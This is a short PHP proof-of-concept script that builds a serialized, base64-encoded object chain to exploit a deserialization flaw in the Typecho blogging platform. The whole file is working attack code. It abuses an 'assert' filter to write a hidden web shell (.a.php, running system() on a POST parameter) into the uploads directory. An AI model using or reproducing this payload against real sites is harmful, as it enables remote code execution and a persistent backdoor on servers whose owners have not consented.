<?php
class Typecho_Feed
{
const RSS2 = 'RSS 2.0';
private $_type;
private $_charset;
private $_lang;
private $_items = array();
public function __construct($version, $type = self::RSS2, $charset = 'UTF-8', $lang = 'en')
{
$this->_version = $version;
$this->_type = $type;
$this->_charset = $charset;
$this->_lang = $lang;
}
public function addItem(array $item)
{
$this->_items[] = $item;
}
}
class Typecho_Request
{
private $_params = array('screenName'=>'fputs(fopen(\'./usr/uploads/.a.php\',\'w\'),\'<?php @system($_POST[_3d24d8de]);?>\')');
private $_filter = array('assert');
//private $_filter = array('assert', array('Typecho_Response', 'redirect'));
}
$payload1 = new Typecho_Feed(5, 'ATOM 1.0');
$payload2 = new Typecho_Request();
$payload1->addItem(array('author' => $payload2));
$exp['adapter'] = $payload1;
$exp['prefix'] = 'Rai4over';
echo base64_encode(serialize($exp));
